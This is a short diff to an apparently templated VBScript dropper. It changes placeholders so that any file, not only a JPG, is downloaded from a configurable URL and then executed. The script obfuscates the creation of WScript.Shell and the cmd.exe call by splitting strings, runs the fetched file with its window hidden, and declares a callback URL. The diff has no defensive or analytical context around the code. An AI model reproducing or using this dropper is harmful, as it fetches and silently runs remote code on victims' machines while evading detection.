@@ -8,10 +8,10 @@ CONST callbackUrl = "%CALLBACK_URL%"
 Set oS = CreateObject ("WSc" & "ript." & "Sh" & "ell")
 
 Dim downloadSucceeded
-downloadSucceeded = DownloadFile("%JPG_URL%","%JPG_OUTPUT_NAME%")
+downloadSucceeded = DownloadFile("%FILE_URL%","%FILE_OUTPUT_NAME%")
 
 If downloadSucceeded Then
-    oS.run "c" & "md.e" & "xe /C start "" "" " & tmpFolder & "\%JPG_OUTPUT_NAME% & timeout 1", 0, True
+    oS.run "c" & "md.e" & "xe /C start "" "" " & tmpFolder & "\%FILE_OUTPUT_NAME% & timeout 1", 0, True
 End If
 
 
